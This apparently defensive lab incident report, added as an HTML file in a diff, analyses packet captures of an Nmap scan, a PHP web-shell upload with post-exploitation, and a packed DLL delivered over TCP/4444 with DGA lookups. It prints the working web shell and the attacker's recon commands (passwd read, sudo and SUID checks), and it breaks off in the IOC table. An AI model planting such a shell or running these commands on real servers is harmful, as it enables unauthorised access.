@@ -1,0 +1,830 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Network Attack Investigation</title><style>
+@page { size: A4; margin: 18mm 16mm; }
+body { font-family: "DejaVu Sans", Arial, sans-serif; font-size: 9.5pt; line-height: 1.45; color:#1a1a1a; }
+h1 { font-size: 20pt; border-bottom: 3px solid #b00020; padding-bottom:6px; }
+h2 { font-size: 14pt; color:#b00020; margin-top:18px; border-bottom:1px solid #ddd; }
+h3 { font-size: 11.5pt; color:#222; margin-top:14px; }
+code { font-family:"DejaVu Sans Mono", monospace; font-size:8.5pt; background:#f2f2f2; padding:1px 3px; }
+pre { background:#f6f6f6; border-left:3px solid #b00020; padding:6px 8px; font-size:8pt; white-space:pre-wrap; }
+table { border-collapse: collapse; width:100%; margin:8px 0; font-size:8.5pt; }
+th, td { border:1px solid #ccc; padding:3px 5px; text-align:left; vertical-align:top; }
+th { background:#eee; }
+blockquote { border-left:4px solid #f0ad4e; background:#fff8e6; margin:8px 0; padding:6px 10px; }
+</style></head><body><h1>Network Attack Investigation — Weeks 2–3 Captures</h1>
+<p><strong>Report date:</strong> 11 November 2026
+<strong>Analyst:</strong> Youssef (lab investigation)
+<strong>Evidence packages:</strong></p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>File</th>
+<th>Packets</th>
+<th>Bytes</th>
+<th>Capture window (local)</th>
+<th>Duration</th>
+<th>SHA-256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>webshell.pcap</code></td>
+<td>202</td>
+<td>46,898</td>
+<td>2026-11-08 11:29:41.887 → 11:29:45.377</td>
+<td>3.49 s</td>
+<td><code>afd37fce6a969c8296a1de80e99fae1950311592842475f197f07b435dd9f84e</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>nmap.pcap</code></td>
+<td>134,578</td>
+<td>8,200,883</td>
+<td>2026-11-07 21:41:04.772 → 21:47:27.702</td>
+<td>382.93 s</td>
+<td><code>e1805ef0e8a79461e78c9a3fdbfd68b3bba7f7949d9d51d39c9352f60030d292</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>C2+DGA-ether.pcap</code></td>
+<td>52,737</td>
+<td>14,435,075</td>
+<td>2026-11-07 00:07:09.695 → 00:20:42.617</td>
+<td>812.92 s</td>
+<td><code>2f6c120689aa0888fe5a40639893457aa60e896b3eded413d625bb36fc602911</code></td>
+</tr>
+</tbody>
+</table>
+<p>Analysed with TShark 4.2.2 only (Zeek/Suricata not installed). Every number in this report comes from a command listed in <code>Evidence/commands-and-filters.md</code>.</p>
+<hr />
+<h2>1. Executive summary</h2>
+<p>Three captures document three phases of activity against the same lab estate.</p>
+<ol>
+<li><strong><code>webshell.pcap</code> — successful web-shell compromise (Confirmed).</strong> At 09:29:41 GMT on 8 Nov 2026, host <strong>192.168.1[.]1</strong> uploaded <code>shell.php</code> through the public upload form on <strong>192.168.1[.]128</strong> (<code>/upload.php</code>, Blackstone Technologies site) and then executed <strong>15 reconnaissance commands</strong> through <code>GET /uploads/shell.php?cmd=…</code> in 172 ms. The target is <strong><code>wazuh-server</code></strong>, Ubuntu 26.04.1, running as <code>www-data</code>, and the attacker enumerated users, processes, listening services, network interfaces, environment and SUID binaries. A second web shell, <code>exploit.php</code>, was already present from an earlier attempt (09:02).</li>
+<li><strong><code>nmap.pcap</code> — full-port reconnaissance of the same server (Confirmed).</strong> <strong>172.16.173[.]1</strong> SYN-scanned all <strong>65,535 TCP ports</strong> of <strong>172.16.173[.]138</strong> in roughly one second, found <strong>six open ports (22, 80, 443, 1514, 1515, 55000)</strong>, then ran Nmap service/version detection and NSE HTTP scripts for ~2 minutes. The target <code>172.16.173[.]138</code> is the <em>second NIC of the very host compromised in capture 1</em> (<code>00:0c:29:52:c7:95</code>), so recon → exploitation is a single kill chain.</li>
+<li><strong><code>C2+DGA-ether.pcap</code> — payload delivery plus DGA (Confirmed delivery, Likely C2).</strong> A <strong>255,676-byte packed PE DLL (<code>server.dll</code>, 64-bit)</strong> was served over <strong>TCP/4444</strong> from <strong>192.168.1[.]13</strong> to <strong>192.168.1[.]120</strong> twice (261.5 s and 299.8 s). Seven minutes later <strong>192.168.1[.]120</strong> emitted <strong>four DGA-style domains</strong> to 8[.]8[.]8[.]8 (all NXDOMAIN). The same capture contains classic lab noise (browser traffic to DeepSeek/ChatGPT/Google, loopback PostgreSQL), so only the 4444 + DGA activity is malicious.</li>
+</ol>
+<p><strong>Overall verdict:</strong> the estate was <em>reconnoitred (11-07 19:41 UTC) and then compromised via an unrestricted file upload (11-08 09:29 UTC)</em>; a separate host pair was used for C2/DGA and stage-2 payload delivery/training. No lateral movement or data exfiltration is visible in these three captures.</p>
+<hr />
+<h2>2. Scope and method</h2>
+<ul>
+<li><strong>In scope:</strong> the three PCAPs above, nothing else.</li>
+<li><strong>Method:</strong> <code>capinfos</code> inventory → protocol hierarchy → conversations/endpoints (baseline) → targeted display filters → stream reassembly → artifact extraction and hashing.</li>
+<li><strong>Confidence labels:</strong> <em>Confirmed</em> = directly visible in packets; <em>Likely</em> = strong convergent evidence; <em>Possible</em> = plausible but alternative explanations exist.</li>
+<li><strong>IOC convention:</strong> external addresses/domains are defanged (<code>hxxp://</code>, <code>1[.]2[.]3[.]4</code>); private RFC1918 addresses are left readable. Raw values for tooling are in <code>IOCs.csv</code>.</li>
+</ul>
+<hr />
+<h2>3. Baseline summary</h2>
+<table>
+<thead>
+<tr>
+<th>Capture</th>
+<th>Protocol mix</th>
+<th>Notable talkers</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>webshell.pcap</code></td>
+<td>100 % HTTP over TCP/80 (34 HTTP frames, 17 requests / 17 responses)</td>
+<td>192.168.1.1 → 192.168.1.128</td>
+</tr>
+<tr>
+<td><code>nmap.pcap</code></td>
+<td>99.95 % TCP (65,825 SYNs of 134,518 TCP frames), 19 UDP (DHCP+NTP), 26 ICMP, 857 TLS frames</td>
+<td>172.16.173.1 ↔ 172.16.173.138</td>
+</tr>
+<tr>
+<td><code>C2+DGA-ether.pcap</code></td>
+<td>TCP 47,829 (incl. 20,366 <code>data</code> frames), UDP 4,390 (2,647 QUIC, 1,374 DNS), ICMP 36, ARP 294</td>
+<td>192.168.1.13, 192.168.1.120, 127.0.0.1 (loopback Postgres), 3.173.21.63 (DeepSeek)</td>
+</tr>
+</tbody>
+</table>
+<p>Normal background identified and excluded from findings:</p>
+<ul>
+<li><strong>Ubuntu infrastructure traffic</strong> (<code>185.125.190.101/.121/.122/.123</code>, <code>91.189.91.57/.96/.112/.113</code>): NTP and <code>connectivity-check.ubuntu.com</code> HTTP probes — benign.</li>
+<li><strong>User browsing</strong> in <code>C2+DGA</code>: TLS/SNI to <code>chat.deepseek.com</code>, <code>hif-leim.deepseek.com</code>, <code>fe-static.deepseek.com</code> (3.173.21.63, 172.217.x, 142.251.x), <code>chatgpt.com</code>, <code>opencode.ai</code>, <code>ssl.gstatic.com</code>, <code>mail.google.com</code>, <code>acrobat.adobe.com</code> — benign.</li>
+<li><strong>Loopback traffic</strong> <code>127.0.0.1:53474 → 127.0.0.1:5433</code> (19,902 frames): PostgreSQL wire protocol (<code>SELECT current_database();</code>) — a local client, benign.</li>
+<li><strong><code>gator.volces.com.&lt;16 hex&gt;.queniuck.com</code></strong> (12 × type-65/SVCB queries, ~61 s apart): this is the classic <em>DNS search-suffix leak</em> (a VPN/DNS suffix appended to a legitimate ByteDance telemetry name), not DGA — see §6.6.</li>
+</ul>
+<hr />
+<h2>4. Case 1 — Web shell upload and post-exploitation (<code>webshell.pcap</code>)</h2>
+<h3>4.1 What happened (Confirmed)</h3>
+<table>
+<thead>
+<tr>
+<th>Time (rel)</th>
+<th>Frame</th>
+<th>Request</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0.0002 s</td>
+<td>4</td>
+<td><code>GET /upload.php</code></td>
+<td><code>User-Agent: curl/8.5.0</code>, <code>Cookie: PHPSESSID=4f21e6ca…</code></td>
+</tr>
+<tr>
+<td>0.0144 s</td>
+<td>27</td>
+<td><code>POST /upload.php</code> (504 B)</td>
+<td>multipart with a <strong>valid CSRF token</strong> <code>d985dd65…8503</code> + <code>filename="shell.php"</code></td>
+</tr>
+<tr>
+<td>0.0250 s</td>
+<td>54</td>
+<td><code>GET /uploads/shell.php?cmd=whoami</code></td>
+<td>web shell live</td>
+</tr>
+<tr>
+<td>…</td>
+<td>64–186</td>
+<td>13 more <code>cmd=</code> requests</td>
+<td>discovery</td>
+</tr>
+<tr>
+<td>0.1721 s</td>
+<td>196</td>
+<td><code>GET /uploads/shell.php?cmd=find / -perm -4000 -type f</code></td>
+<td>privilege-escalation hunt</td>
+</tr>
+</tbody>
+</table>
+<p>All 17 responses are <strong>HTTP 200</strong>; the shell's output is returned as <code>text/plain</code>. The whole sequence is automated (17 requests in 172 ms, constant <code>curl/8.5.0</code> UA), i.e. a scripted loop, not a human typing.</p>
+<h3>4.2 The uploaded web shell (Confirmed)</h3>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['cmd'])) {
+    header('Content-Type: text/plain; charset=utf-8');
+    echo shell_exec($_GET['cmd'] . ' 2&gt;&amp;1');
+}
+</code></pre>
+<p>135 bytes, uploaded as <code>application/x-php</code>, served from <code>/var/www/blackstone/uploads/</code>.</p>
+<h3>4.3 Post-exploitation commands and results (Confirmed)</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Command</th>
+<th>Result (abridged)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>whoami</code></td>
+<td><code>www-data</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>id</code></td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>hostname</code></td>
+<td><code>wazuh-server</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>uname -a</code></td>
+<td><code>Linux wazuh-server 7.0.0-42-generic … x86_64 GNU/Linux</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>cat /etc/os-release</code></td>
+<td><code>Ubuntu 26.04.1 LTS (Resolute Raccoon)</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>pwd</code></td>
+<td><code>/var/www/blackstone/uploads</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>ls -la /var/www/blackstone/</code></td>
+<td>source tree incl. <code>upload.php</code> (19,989 B, <strong>modified 08:51 same day</strong>), <code>db.php</code>, <code>schema.sql</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>ls -la /var/www/blackstone/uploads/</code></td>
+<td><strong><code>exploit.php</code> (223 B, 09:02)</strong> + <strong><code>shell.php</code> (135 B, 09:29)</strong></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>cat /etc/passwd \| head -10</code></td>
+<td>local account list</td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>ps aux \| head -15</code></td>
+<td>process list as <code>www-data</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>ss -tlnp \|\| netstat -tlnp</code></td>
+<td>LISTEN: <strong>22, 80, 443, 1514, 1515, 55000</strong>, 3306 (lo), 9200/9300 (lo), 53 (lo)</td>
+</tr>
+<tr>
+<td>12</td>
+<td><code>ip -4 addr show</code></td>
+<td><code>ens33 192.168.1.128/24</code>, <code>ens36 172.16.173.138/24</code></td>
+</tr>
+<tr>
+<td>13</td>
+<td><code>env</code></td>
+<td><code>USER=root</code>, <code>APACHE_RUN_USER=www-data</code>, <code>PWD=/var/www/blackstone/uploads</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td><code>sudo -l</code></td>
+<td><code>Sorry, user www-data may not run sudo on wazuh-server.</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td><code>find / -perm -4000 -type f</code></td>
+<td>snap SUID set (<code>/snap/core24/1643/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}</code>, dbus helper)</td>
+</tr>
+</tbody>
+</table>
+<p>Full transcript: <code>Evidence/webshell-command-transcript.md</code>.</p>
+<h3>4.4 Why it matters</h3>
+<ul>
+<li>The upload directory is <strong>web-executable</strong> — any file accepted by <code>upload.php</code> runs as PHP. This is the root cause (<code>T1505.003</code> + <code>T1190</code>).</li>
+<li><code>www-data</code> could not <code>sudo</code>, so no immediate privilege escalation; however, the attacker now has a persistent, low-noise C2 channel (GET parameters) inside a document root.</li>
+<li>Listening ports <strong>1514/1515/55000</strong> identify <strong>Wazuh</strong> (agent/manager/authd); 9200/9300 are OpenSearch. This makes the host a high-value pivot point for the whole SOC estate.</li>
+<li><code>exploit.php</code> (09:02) proves an <strong>earlier upload 27 minutes before</strong> this capture — the entry point had already been used.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Severity</th>
+<th>Confidence</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WEB-01 Unrestricted file upload → web shell</td>
+<td>Critical</td>
+<td>Confirmed</td>
+<td>T1190, T1505.003</td>
+</tr>
+<tr>
+<td>WEB-02 Post-exploitation discovery (users/host/net/process/SUID)</td>
+<td>High</td>
+<td>Confirmed</td>
+<td>T1033, T1087.001, T1082, T1016, T1057, T1083</td>
+</tr>
+<tr>
+<td>WEB-03 Local privilege-escalation attempt (<code>sudo -l</code>, SUID hunt)</td>
+<td>Medium</td>
+<td>Confirmed</td>
+<td>T1548.003, T1548.001</td>
+</tr>
+<tr>
+<td>WEB-04 Prior shell <code>exploit.php</code> present</td>
+<td>High</td>
+<td>Confirmed</td>
+<td>T1505.003</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>5. Case 2 — Full-port reconnaissance (<code>nmap.pcap</code>)</h2>
+<h3>5.1 What happened (Confirmed)</h3>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Time (rel)</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Port sweep</td>
+<td>258.40 → 259.21 s</td>
+<td><strong>65,825 SYN</strong> packets, <strong>65,535 distinct destination ports</strong> 1–65535 (65,541 SYNs in 0.81 s ≈ 80 k pps), answered by <strong>65,700 RST+ACK</strong></td>
+</tr>
+<tr>
+<td>Service detection</td>
+<td>259.2 → 367.6 s</td>
+<td><code>\r\n\r\n</code> NULL probes, portmap, SIP, GIOP, NCP probes, TLS handshakes, 76 HTTP frames</td>
+</tr>
+<tr>
+<td>NSE scripts</td>
+<td>367.6 → 382.9 s</td>
+<td>HTTP requests with UA <code>Mozilla/5.0 (compatible; Nmap Scripting Engine; …)</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Open ports:</strong> <code>22/tcp</code> (SSH), <code>80/tcp</code> (HTTP), <code>443/tcp</code> (TLS), <code>1514/tcp</code>, <code>1515/tcp</code>, <code>55000/tcp</code> (Wazuh).
+Banner: <code>Apache/2.4.66 (Ubuntu)</code>, index page 2,093 bytes; <code>404</code> for most probes.</p>
+<p><strong>NSE probe set observed</strong> (fingerprints <code>http-enum</code>, <code>http-methods</code>, <code>http-webdav-scan</code>, <code>http-title</code>, <code>http-headers</code>, <code>http-git</code>, <code>http-hnap</code>, <code>http-vuln-*</code> style checks):</p>
+<pre><code>GET /                      OPTIONS /                 PROPFIND /
+GET /robots.txt            GET /.git/HEAD            GET /HNAP1
+GET /evox/about            POST /sdk                 POST /IPHTTPS
+GET /nmaplowercheck1794080832
+GET /nice%20ports%2C/Tri%6Eity.txt%2ebak     HEAD /     GET /favicon.ico
+</code></pre>
+<h3>5.2 Evasion characteristics (Confirmed observation / Possible intent)</h3>
+<ul>
+<li>Destination ports are issued in <strong>random order</strong> (80, 25, 1723, 3306, 5900, 995, 21, 199, 143, …).</li>
+<li><strong>IP TTL is randomised per packet</strong> across <strong>24 distinct values in the range 37–64</strong> — ~2,800 SYNs per TTL value.</li>
+<li><strong>IP ID is random</strong> on every SYN.</li>
+<li>~80 k SYNs/second during the sweep (65,541 SYNs in 0.81 s); 290 packets were retransmissions (65,825 SYNs vs 65,535 ports).</li>
+</ul>
+<p>Randomised TTL/IP-ID is not default Nmap behaviour; it indicates a deliberately noisy/evasive scanner configuration (custom build, wrapper, or a patched Nmap) and defeats naive TTL-based OS fingerprinting.</p>
+<h3>5.3 Why it matters</h3>
+<ul>
+<li>A complete 65,535-port scan in <strong>&lt;1 s</strong> is loud but shows a capable, automated adversary who knows exactly what to look for.</li>
+<li>The NSE phase actively tested for WebDAV, Git exposure, HNAP and other web weaknesses — the same class of weakness that was exploited in Case 1.</li>
+<li>The scan preceded the web-shell attack by ~13 h 48 min (19:41 UTC on 11-07 vs 09:29 UTC on 11-08).</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Severity</th>
+<th>Confidence</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>REC-01 Full TCP port scan (65,535 ports)</td>
+<td>Medium</td>
+<td>Confirmed</td>
+<td>T1046, T1595.002</td>
+</tr>
+<tr>
+<td>REC-02 Service/version detection + NSE vulnerability probes</td>
+<td>Medium</td>
+<td>Confirmed</td>
+<td>T1595.002, T1592</td>
+</tr>
+<tr>
+<td>REC-03 Packet-level evasion (random TTL/IP-ID)</td>
+<td>Low</td>
+<td>Possible</td>
+<td>T1595, T1036 (masquerading of scanner)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>6. Case 3 — C2 channel, stage-2 payload and DGA (<code>C2+DGA-ether.pcap</code>)</h2>
+<h3>6.1 Topology observed</h3>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Role in capture</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>192.168.1.13</td>
+<td>main endpoint; serves TCP/4444 payload; queries <code>c2.dga-lab.com</code>; browses DeepSeek/ChatGPT</td>
+<td>MAC <code>62:11:48:63:66:0f</code></td>
+</tr>
+<tr>
+<td>192.168.1.120</td>
+<td>client of 4444; generates DGA lookups</td>
+<td><strong>same MAC <code>62:11:48:63:66:0f</code></strong></td>
+</tr>
+<tr>
+<td>192.168.1.1</td>
+<td>gateway/DNS</td>
+<td>—</td>
+</tr>
+<tr>
+<td>127.0.0.1</td>
+<td>loopback resolver (53) and PostgreSQL (5433)</td>
+<td>capture-side noise</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Important caveat:</strong> both 192.168.1.13 and 192.168.1.120 appear in ARP with the <strong>same locally-administered MAC</strong>. Either the two addresses live on one NIC/host (lab simulation, IP alias, virtual adapter) or the source was spoofed. Role attribution below is therefore based on <em>behaviour</em>, not on host identity.</p>
+</blockquote>
+<h3>6.2 Event timeline</h3>
+<table>
+<thead>
+<tr>
+<th>Time (rel)</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7.66 s</td>
+<td>Long-lived TLS session to <strong>102.132.97[.]54:443</strong> starts (lasts 793 s, 55 kB, no SNI/cert visible)</td>
+</tr>
+<tr>
+<td>26.7 → 70.8 s</td>
+<td><strong>Port scan</strong> 192.168.1.13 → 192.168.1.120: 4,432 SYNs, <strong>1,000 ports</strong></td>
+</tr>
+<tr>
+<td>27.84 / 64.43 s</td>
+<td>192.168.1.13 → 192.168.1.120<strong>:4444</strong> — <strong>connection refused</strong> (RST+ACK)</td>
+</tr>
+<tr>
+<td>28.66 s</td>
+<td>ICMP echo ×4 to 192.168.1.120 (zero payload; liveness check)</td>
+</tr>
+<tr>
+<td>138.54 / 163.80 s</td>
+<td><code>c2.dga-lab.com</code> A+AAAA lookups — <strong>NXDOMAIN</strong> (25.3 s apart)</td>
+</tr>
+<tr>
+<td>155.7 → 176.3 s</td>
+<td>192.168.1.120 → 192.168.1.13<strong>:4444</strong> — 52 SYNs, no answer (listener not up)</td>
+</tr>
+<tr>
+<td><strong>261.56 s</strong></td>
+<td><strong>TCP/4444 session 1</strong> — 4-byte length prefix <code>0x0003E6BC</code> + <strong>255,676-byte PE</strong> delivered</td>
+</tr>
+<tr>
+<td><strong>299.80 s</strong></td>
+<td><strong>TCP/4444 session 2</strong> — same size, different build</td>
+</tr>
+<tr>
+<td>697.2 → 702.4 s</td>
+<td><strong>DGA lookups</strong> from 192.168.1.120 to 8[.]8[.]8[.]8</td>
+</tr>
+<tr>
+<td>812.9 s</td>
+<td>capture ends</td>
+</tr>
+</tbody>
+</table>
+<h3>6.3 The 4444 channel and delivered payload (Confirmed)</h3>
+<ul>
+<li>Framing: <code>uint32 LE length</code> followed by the file body.</li>
+<li>Size: <strong>255,676 bytes</strong> (0x3E6BC) in both sessions; trailing data on the channel (~314 kB) is obfuscated (4-byte repeating XOR-style encoding).</li>
+<li>Type: <strong>PE32+ DLL, x86-64, GUI, 6 sections</strong>, export table name <strong><code>server.dll</code></strong>, one export.</li>
+<li>Packed: section <code>.text</code> is high-entropy; file begins with the <code>MZARUH</code> stub and embeds <code>inflate/deflate 1.0.4 (Jean-loup Gailly / Mark Adler)</code> strings — characteristic of a <strong>UPX 4.x-family packer with a modified stub</strong> (the <code>UPX!</code> trailer is absent). <em>Likely</em> UPX variant; <strong>Confirmed</strong> packed/obfuscated.</li>
+<li>Imported APIs of note: <code>WS2_32</code> (<code>getaddrinfo</code>, <code>WSADuplicateSocketA</code>), <code>WININET</code>/<code>WINHTTP</code> (<code>HttpOpenRequestW</code>, <code>HttpSendRequestW</code>, <code>WinHttpOpen</code>), <code>CRYPT32</code> (<code>CryptStringToBinaryA</code>, <code>CryptImportPublicKeyInfo</code>), <code>ADVAPI32</code> (<code>OpenThreadToken</code>, <code>SetSecurityDescriptorDacl</code>), <code>USER32</code> (<code>GetProcessWindowStation</code>, <code>GetThreadDesktop</code>). This is a network-capable loader/backdoor DLL, not a document.</li>
+<li>Two builds differ in only 180 bytes at the end of the file → same code, per-victim/per-campaign tail (typical of a builder that stamps an ID or key).</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>SHA-256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>session 1 payload</td>
+<td><code>f274bc4563d74e09be922d3fd5c51c30e0c704f2ae52848cab9d31809741346e</code></td>
+</tr>
+<tr>
+<td>session 2 payload</td>
+<td><code>915e6ca939e2f1f2267736af266195d290d5f999989f7e6c18525128d29fa16f</code></td>
+</tr>
+</tbody>
+</table>
+<p>Samples stored (inert bytes, do <strong>not</strong> execute): <code>Evidence/Samples/payload_4444_stream36{19,21}.dll.bin</code>.</p>
+<h3>6.4 Role interpretation (two readings)</h3>
+<ul>
+<li><strong>Reading A (preferred, <em>Likely</em>):</strong> 192.168.1.120 is the infected host. It scans, polls until an operator/C2 brings up TCP/4444, downloads the stage-2 DLL twice, and ~7 minutes later executes it — the freshly delivered implant performs DGA lookups to find its real C2.</li>
+<li><strong>Reading B (<em>Possible</em>):</strong> 192.168.1.13 is the C2/payload host and 192.168.1.120 a second victim; the DGA on .120 is an independent infection.</li>
+</ul>
+<p>Packet data cannot settle this because the two addresses share one MAC. Host/EDR telemetry from both machines is required.</p>
+<h3>6.5 DGA evidence (Confirmed)</h3>
+<table>
+<thead>
+<tr>
+<th>Time (rel)</th>
+<th>Domain</th>
+<th>QTYPE</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>697.26 s</td>
+<td><code>akfjqweklzx[.]com</code></td>
+<td>A, AAAA (×2)</td>
+<td>NXDOMAIN (rcode 3)</td>
+</tr>
+<tr>
+<td>697.63 s</td>
+<td><code>pqowieurtyx[.]net</code></td>
+<td>A, AAAA (×2)</td>
+<td>NXDOMAIN</td>
+</tr>
+<tr>
+<td>698.03 s</td>
+<td><code>zmxncbvalkj[.]org</code></td>
+<td>A, AAAA (×2)</td>
+<td>NXDOMAIN</td>
+</tr>
+<tr>
+<td>701.53 s</td>
+<td><code>asdfghjklqwe[.]com</code></td>
+<td>A, AAAA (×2)</td>
+<td>NODATA (rcode 0, no answer)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>20 queries in <strong>5.2 s</strong>, sent <strong>directly to 8[.]8[.]8[.]8</strong> (bypassing the local resolver), each batch preceded by a PTR lookup for <code>8.8.8.8.in-addr.arpa</code>.</li>
+<li>Names are keyboard walks (<code>qwerty</code>/<code>asdf</code>/<code>zxcvbnm</code> patterns) of 11–12 characters — a deliberately simple <em>lab DGA</em>, not a real-world algorithm.</li>
+<li><code>c2.dga-lab[.]com</code> (from .13) is queried twice, 25.3 s apart, and <strong>never resolves</strong> — a C2 rendezvous that fails over to DGA.</li>
+</ul>
+<h3>6.6 Benign look-alikes explicitly excluded</h3>
+<ul>
+<li><code>gator.volces.com.&lt;16-hex&gt;.queniuck.com</code> — 12 HTTPS/SVCB (type 65) queries at ~61 s intervals. This is a <strong>DNS search-suffix leak</strong> (queniuck.com is appended as a suffix to a legitimate ByteDance/Volcengine telemetry name). Fixed interval + constant parent + hex label = client behaviour, not DGA. <em>Likely benign.</em></li>
+<li><code>102.132.97[.]54:443</code> — 793 s TLS/1.2 session, 55 kB, no SNI/certificate captured (mid-stream). Consistent with a messenger/push channel; <strong>Possible</strong> covert C2 but no supporting indicator. Keep on a watchlist.</li>
+<li><code>3.173.21[.]63</code> — resolves to DeepSeek endpoints (<code>chat.deepseek.com</code>), 1.6 MB of normal app traffic.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Severity</th>
+<th>Confidence</th>
+<th>ATT&amp;CK</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C2-01 Stage-2 PE DLL delivered over TCP/4444</td>
+<td>Critical</td>
+<td>Confirmed</td>
+<td>T1105, T1571, T1027</td>
+</tr>
+<tr>
+<td>C2-02 Domain Generation Algorithm queries</td>
+<td>High</td>
+<td>Confirmed</td>
+<td>T1568.002, T1071.004</td>
+</tr>
+<tr>
+<td>C2-03 Failed C2 rendezvous <code>c2.dga-lab.com</code></td>
+<td>Medium</td>
+<td>Confirmed</td>
+<td>T1071.004, T1008</td>
+</tr>
+<tr>
+<td>C2-04 Internal port scan of 192.168.1.120</td>
+<td>Medium</td>
+<td>Confirmed</td>
+<td>T1046, T1018</td>
+</tr>
+<tr>
+<td>C2-05 Long-lived TLS to bare IP without SNI</td>
+<td>Low</td>
+<td>Possible</td>
+<td>T1071.001, T1573</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>7. Cross-capture correlation</h2>
+<p><strong>Confirmed link between Cases 1 and 2</strong> — the web-shell victim and the scanned host are the same machine:</p>
+<table>
+<thead>
+<tr>
+<th>Evidence</th>
+<th><code>nmap.pcap</code></th>
+<th><code>webshell.pcap</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IP</td>
+<td>172.16.173.138</td>
+<td>192.168.1.128</td>
+</tr>
+<tr>
+<td>MAC</td>
+<td><code>00:0c:29:52:c7:95</code> (ARP)</td>
+<td><code>00:0c:29:52:c7:8b</code> (ens33) / <code>…c7:95</code> (ens36, per <code>ip -4 addr</code>)</td>
+</tr>
+<tr>
+<td>Hostname</td>
+<td>—</td>
+<td><code>wazuh-server</code></td>
+</tr>
+<tr>
+<td>Web server</td>
+<td><code>Apache/2.4.66 (Ubuntu)</code>, 2,093-byte index</td>
+<td><code>Apache/2.4.66 (Ubuntu)</code>, same app</td>
+</tr>
+<tr>
+<td>Services</td>
+<td>22, 80, 443, 1514, 1515, 55000 open</td>
+<td><code>ss -tlnp</code> shows exactly 22, 80, 443, 1514, 1515, 55000</td>
+</tr>
+</tbody>
+</table>
+<p>Sequence: <strong>recon 2026-11-07 19:41 UTC → compromise 2026-11-08 09:29 UTC</strong> (≈13 h 48 min later, likely after the earlier <code>exploit.php</code> attempt at 09:02).</p>
+<p><code>C2+DGA-ether.pcap</code> (00:07 on 11-07) is on the same /24 as the web-shell target (192.168.1.0/24) but involves different hosts (.13/.120) and is best treated as a parallel/earlier exercise rather than part of the same intrusion chain (no shared IP, MAC or domain).</p>
+<hr />
+<h2>8. Indicators of compromise</h2>
+<p>Defanged. Raw values in <code>IOCs.csv</code>.</p>
+<h3>Network</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+<th>Context</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IPv4</td>
+<td><code>192.168.1[.]1</code></td>
+<td>web-shell client</td>
+</tr>
+<tr>
+<td>IPv4</td>
+<td><code>192.168.1[.]128</code></td>
+<td>web-shell victim (ens33)</td>
+</tr>
+<tr>
+<td>IPv4</td>
+<td><code>172.16.173[.]138</code></td>
+<td>same victim (ens36), nmap target</td>
+</tr>
+<tr>
+<td>IPv4</td>
+<td><code>172.16.173[.]1</code></td>
+<td>scanner</td>
+</tr>
+<tr>
+<td>IPv4</td>
+<td><code>192.168.1[.]13</code> / <code>192.168.1[.]120</code></td>
+<td>4444 payload host / client + DGA</td>
+</tr>
+<tr>
+<td>IPv4</td>
+<td><code>102.132.97[.]54</code></td>
+<td>long-lived TLS, no SNI (watchlist)</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>c2.dga-lab[.]com</code></td>
+<td>failed C2 (NXDOMAIN)</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>akfjqweklzx[.]com</code>, <code>pqowieurtyx[.]net</code>, <code>zmxncbvalkj[.]org</code>, <code>asdfghjklqwe[.]com</code></td>
+<td>DGA</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>hxxp://192.168.1[.]128/upload.php</code></td>
+<td>upload endpoint</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>hxxp://192.168.1[.]128/uploads/shell.php?cmd=</code></td>
+<td>web shell</td>
+</tr>
+<tr>
+<td>URI path</td>
